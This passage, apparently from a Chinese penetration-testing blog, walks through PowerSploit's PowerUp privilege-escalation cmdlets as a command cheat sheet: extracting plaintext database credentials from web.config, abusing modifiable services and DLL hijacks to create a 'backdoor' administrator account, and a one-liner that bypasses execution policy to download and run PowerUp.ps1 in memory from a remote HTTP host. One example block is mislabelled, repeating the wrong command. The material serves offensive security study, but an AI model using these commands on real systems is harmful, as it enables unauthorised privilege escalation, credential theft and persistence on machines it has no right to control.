<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService</span><br><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService</span><br><span class="line">HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService</span><br><span class="line">HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ModifiableRegistryAutoRun</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/28.png" alt></p>
<p><strong>13.Get-ModifiableScheduledTaskFile</strong></p>
<p>返回当前用户能够修改的计划任务程序的名称和路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ModifiableScheduledTaskFile</span><br></pre></td></tr></table></figure>

<p><strong>14.Get-Webconfig</strong></p>
<p>返回当前服务器上的web.config文件中的数据库连接字符串的明文。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-webconfig</span><br></pre></td></tr></table></figure>

<p><strong>15.Invoke-ServiceAbuse</strong></p>
<p>用来通过修改服务添加用户到指定组，并可以通过定制-cmd参数触发添加用户的自定义命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Invoke-ServiceAbuse -ServiceName VulnSVC // 添加默认账号</span><br><span class="line">Invoke-ServiceAbuse -ServiceName VulnSVC -UserName &quot;TESTLABjohn&quot; // 指定添加域账号</span><br><span class="line">Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup &quot;Administrators&quot; // 指定添加用户，用户密码以及添加的用户组。Invoke-ServiceAbuse -ServiceName VulnSVC -Command &quot;net ...&quot;// 自定义执行命令</span><br></pre></td></tr></table></figure>

<p><strong>16.Restore-ServiceBinary</strong></p>
<p>恢复服务的可执行文件到原始目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Restore-ServiceBinary -ServiceName VulnSVC</span><br></pre></td></tr></table></figure>

<p><strong>17.Test-ServiceDaclPermission</strong></p>
<p>检查某个用户是否在一个服务有自由访问控制的权限，返回true或false</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Restore-ServiceBinary -ServiceName VulnSVC</span><br></pre></td></tr></table></figure>

<p><strong>18.Write-HijackDll</strong></p>
<p>输出一个自定义命令并且能够自删除的bat文件到$env:Tempdebug.bat，并输出一个能够启动这个bat文件的dll</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Write-HijackDll -OutputFile &apos;C:\Users\Admin\Desktop\PowerTools\PowerUp&apos; -Command &apos;whoami&apos;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/PowerShell-PowerSploit/29.png" alt></p>
<p><strong>19.Write-UserAddMSI</strong></p>
<p>生成一个安装文件，运行这个安装文件，则弹出添加用户的框</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Write-UserAddMSI</span><br></pre></td></tr></table></figure>

<p><strong>20.Write-ServiceBinary</strong></p>
<p>预编译C#服务的可执行文件。默认创建一个默认管理员账号。可通过Command定制自己的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Write-ServiceBinary -ServiceName VulnSVC # 添加默认账号</span><br><span class="line">Write-ServiceBinary -ServiceName VulnSVC -UserName &quot;TESTLABjohn&quot; # 指定添加域账号</span><br><span class="line">Write-ServiceBinary-ServiceName VulnSVC -UserName backdoor -Password Password123! # 指定添加用户，用户密码以及添加的用户组</span><br><span class="line">Write-ServiceBinary -ServiceName VulnSVC -Command &quot;net ...&quot; # 自定义执行命令</span><br></pre></td></tr></table></figure>

<p><strong>21.Install-ServiceBinary</strong></p>
<p>通过Write-ServiceBinary写一个C#的服务用来添加用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Install-ServiceBinary -ServiceName DHCP</span><br><span class="line">Install-ServiceBinary -ServiceName VulnSVC -UserName &quot;TESTLABjohn&quot;</span><br><span class="line">Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!</span><br><span class="line">Install-ServiceBinary -ServiceName VulnSVC -Command &quot;net ...&quot;</span><br></pre></td></tr></table></figure>

<p>Write-ServiceBinary与Install-ServiceBinary不同的是前者生成可执行文件，后者直接安装服务</p>
<p><strong>常用记录：</strong></p>
<p>远程加载执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.197.230:8000/Privesc/PowerUp.ps1&apos;);Invoke-AllChecks”</span><br></pre></td></tr></table></figure>

<p>使用IEX在内存中加载此脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(&apos;C:\Users\Admin\Desktop\PowerTools\PowerUp\PowerUp.ps1&apos;);Invoke-AllChecks”</span><br></pre></td></tr></table></figure>

<p>上传好脚本后，输入shell命令进入CMD提示符下，在CMD环境下，使用本地隐藏权限绕过执行该脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>参考资料</p>
<p><a href="https://www.cnblogs.com/yuzly/p/10505365.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/10505365.html</a></p>
</div><!--文章标签--><div class="tags"><a href="/tags/PowerSploit/">PowerSploit</a></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/复现/">复现</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/metasploit/" style="font-size: 18px;">metasploit</a> <a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/文件读取/" style="font-size: 12px;">文件读取</a> <a href="/tags/Cobalt-Strike/" style="font-size: 12px;">Cobalt Strike</a> <a href="/tags/Ngrok/" style="font-size: 12px;">Ngrok</a> <a href="/tags/PowerShell/" style="font-size: 15px;">PowerShell</a> <a href="/tags/文件包含/" style="font-size: 12px;">文件包含</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/QCOW2/" style="font-size: 12px;">QCOW2</a> <a href="/tags/远程代码执行/" style="font-size: 18px;">远程代码执行</a> <a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/免杀/" style="font-size: 18px;">免杀</a> <a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a href="/tags/meterpreter/" style="font-size: 12px;">meterpreter</a> <a href="/tags/msfvenom/" style="font-size: 12px;">msfvenom</a> <a href="/tags/PowerSploit/" style="font-size: 12px;">PowerSploit</a> <a href="/tags/域信息收集/" style="font-size: 15px;">域信息收集</a> <a href="/tags/反序列化/" style="font-size: 12px;">反序列化</a></div></div><div class="widget"><div class="widget-title"> 最新文章</div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/CVE-2020-10560-OSSN任意文件读取漏洞复现/">CVE-2020-10560-OSSN任意文件读取漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/PowerShell-PowerSploit/">PowerShell-PowerSploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/01/SMBv3-1-1-CVE-2020-0796/">SMBv3.1.1_CVE-2020-0796</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/31/内网信息收集二/">内网信息收集二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/30/内网信息收集一/">内网信息收集一</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/18/PowerShell-Empire/">PowerShell-Empire</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/17/免杀初探-Veil/">免杀初探-Veil</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/13/PowerShell基础/">PowerShell基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/免杀初探-msf自免杀/">免杀初探-msf自免杀</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/07/免杀初探/">免杀初探</a></li></ul></div><div class="widget"><div class="widget-title"> 友情链接</div><ul class="links-list"><li class="links-list-item"><a href="https://timeshu.github.io/" title="Time" target="_blank">Time</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></li></ul></div></div></div></div><div id="footer">© <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a> Theme<a target="_blank" href="https://github.com/7ye/maupassant-hexo"> Maupassant.</a></div><a id="back_to_top" href="javascript:void(0)" class="back_to_top"><span>△</span></a><script type="text/javascript" src="/js/totop.js?v=0.0.1"></script><link rel="stylesheet" href="/css/jquery.fancybox.css"><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1"></script><script>function auto_code_fit(){
  if($(".highlight").length != 0){
    var pc_width = $(".post-content").width();
    $(".highlight .code").find("pre").width((pc_width-70)+"px");
  }
}
window.onresize = function(){
  auto_code_fit();
}
auto_code_fit();</script></div></body>